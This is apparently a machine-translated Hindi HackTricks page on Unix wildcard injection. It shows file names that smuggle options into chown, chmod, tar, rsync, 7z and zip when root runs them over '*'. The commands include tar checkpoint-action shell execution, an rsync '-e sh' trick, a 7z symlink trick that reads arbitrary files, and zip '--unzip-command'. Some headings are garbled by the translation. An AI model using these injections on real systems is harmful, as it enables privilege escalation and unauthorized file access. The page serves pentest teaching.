<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


## chown, chmod

आप **इंडिकेट कर सकते हैं कि आप बाकी फ़ाइलों के लिए किस फ़ाइल के मालिक और अनुमतियाँ कॉपी करना चाहते हैं**
```bash
touch "--reference=/my/own/path/filename"
```
आप इसे इस्तेमाल करके एक्सप्लॉइट कर सकते हैं [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(संयुक्त हमला)_\
अधिक जानकारी [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## तार

**क्रियात्मक आदेशों को निषेधित करें:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
आप इसे एक्सप्लॉइट कर सकते हैं [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**क्रियाएँ विचारात्मक रूप से निष्पादित करें:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) का उपयोग करके एक्सप्लॉइट कर सकते हैं _(rsync अटैक)_\
अधिक जानकारी [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) में मिलेगी

## 7z

**7z** में `--` का उपयोग करके `*` से पहले भी (ध्यान दें कि `--` का अर्थ है कि आगे दी गई इनपुट को पैरामीटर के रूप में नहीं लिया जा सकता है, इसलिए इस मामले में केवल फ़ाइल पथ हैं) आप किसी भी त्रुटि को पढ़ने के लिए एक अविचित्रित त्रुटि का कारण बना सकते हैं, इसलिए यदि रूट द्वारा निम्नलिखित एक कमांड को निष्पादित किया जा रहा है:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
और आप इस फ़ोल्डर में फ़ाइलें बना सकते हैं जहाँ यह चलाया जा रहा है, आप `@root.txt` फ़ाइल और `root.txt` फ़ाइल बना सकते हैं जो आपको पढ़ना चाहते हैं की फ़ाइल का **symlink** हो।
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
फिर, जब **7z** को चलाया जाएगा, तो यह `root.txt` को एक फ़ाइल के रूप में देखेगा जिसमें यह सूची होगी कि वह कौन सी फ़ाइलें संकुचित करनी चाहिए (जिसका मतलब है कि `@root.txt` का मौजूद होना) और जब 7z `root.txt` को पढ़ेगा तो यह `/file/you/want/to/read` पढ़ेगा और **जैसा कि इस फ़ाइल की सामग्री फ़ाइलों की सूची नहीं है, इसे त्रुटि दिखाएगा** जो सामग्री है।

_बॉक्स CTF के व्रिट-अप्स में अधिक जानकारी है।_ 

## Zip

**क्रमांक आदेशित कमांड चलाएं:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
